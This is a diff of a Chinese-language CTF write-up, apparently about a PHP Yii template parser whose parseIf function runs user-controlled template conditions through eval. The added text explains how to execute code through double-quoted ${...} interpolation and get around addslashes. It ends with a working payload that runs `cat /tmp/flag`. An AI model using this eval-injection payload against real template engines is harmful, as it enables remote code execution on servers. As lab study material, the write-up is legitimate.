@@ -23,22 +23,15 @@ class ContentController extends \yii\web\Controller
     }
 
     public function actionIndex(){}       //图片保存
-
     public function cn_substr_utf8($str, $length, $start=0){}
-    
     public function cn_substr($str,$slen,$startdd=0){}
-
     public function getSubStrByFromAndEnd($str,$startStr,$endStr,$operType){}
-
     public function buildregx($regstr,$regopt)
     {
         return '/'.str_replace('/','\/',$regstr).'/'.$regopt;
     }
-
     public function parseStrIf($strIf){}
-
     public function parseSubIf($content){}
-
     public function parseIf($content){
         if (strpos($content,'{if:')=== false){
             return $content;
@@ -109,8 +102,17 @@ class ContentController extends \yii\web\Controller
             return json_encode(['error'=>'id error!']);
         }
     }
-
 }
 ```
 
-​	一堆eval，
+​	一堆eval（实际上就是在 if 的 () 条件里或者在 if 的 {} 代码里），我这里弄的是 
+
+@eval("if($strIf){\$resultStr=\"$elseIfArraystr0\";}"); 这个
+
+​	其实过程也比较简单，可以注意到这里用的是双引号，而双引号里面的变量我们可以控制并且在双引号中可以通过 
+
+$ {phpinfo() }
+
+​	这样来执行代码，所以接下来在把 addslashes 给绕一下就差不多了。最后payload：{if:1=1}${${print(`cat /tmp/flag`)}}{elseif:1=1}{else}{end if}
+
+​	在构造payload的时候，因为有一个正则在限制，可以把正则给输出出来。然后在 https://regex101.com/ 这慢慢构造。
